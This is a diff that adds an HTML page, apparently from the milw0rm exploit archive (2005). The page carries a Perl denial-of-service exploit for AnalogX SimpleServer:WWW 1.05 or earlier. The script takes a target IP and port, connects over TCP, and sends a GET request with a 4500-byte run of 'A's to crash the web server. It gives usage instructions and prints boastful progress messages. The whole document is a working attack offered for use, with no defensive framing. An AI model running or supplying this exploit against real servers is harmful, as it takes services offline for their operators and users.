@@ -1,0 +1,40 @@
+<html><head><title>AnalogX SimpleServer:WWW <= 1.05 Denial of Service Exploit</title></head><pre>#!/usr/bin/perl
+
+use IO::Socket;
+
+if (@ARGV &lt;2)
+ {
+  print &quot;\n ::: ---------------------------------------------- :::\n&quot;;
+  print &quot; ::: AnalogX SimpleServer WWW 1.05 Dos Exploit     :::\n&quot;;
+  print &quot; :::                                                :::\n&quot;;
+  print &quot; ::: Advisory : http://www.ussrback.com/labs45.html :::\n&quot;;
+  print &quot; ::: By       : Qnix  - Qnix[at]bsdmail[dot]org     :::\n&quot;;
+  print &quot; :::                                                :::\n&quot;;
+  print &quot; ::: Usage:  analogx_dos.pl [ip] [port]             :::\n&quot;;
+  print &quot; ::: ---------------------------------------------- :::\n&quot;;
+  exit();
+ }
+
+$buf=&quot;A&quot;x4500;
+print &quot;\n &lt;+&gt; Prepare to start connect.\n&quot;;
+sleep(1);
+$s = IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;,
+                           PeerAddr=&gt;$ARGV[0],
+                           PeerPort=&gt;$ARGV[1],
+                           Timeout=&gt;6
+                           ) or die &quot; &lt;-&gt; Target web server already DoSeD ??? or can't connect :(\n\n&quot;;
+ $s-&gt;autoflush();
+
+print &quot; &lt;+&gt; Connected to $ARGV[0]:$ARGV[1]\n&quot;;
+sleep(1);
+print &quot; &lt;+&gt; Sending the devil shit.\n&quot;;
+sleep(1);
+print $s &quot;GET /$buf HTTP/1.1\n&quot;;
+
+print &quot; &lt;+&gt; Prepare to DoS with AAAAAA's .\n&quot;;
+sleep(1);
+close($s);
+
+print &quot; &lt;+&gt; Ok now target web server maybe DoSeD.\n\n&quot;;
+
+# milw0rm.com [2005-07-07]</pre></html>
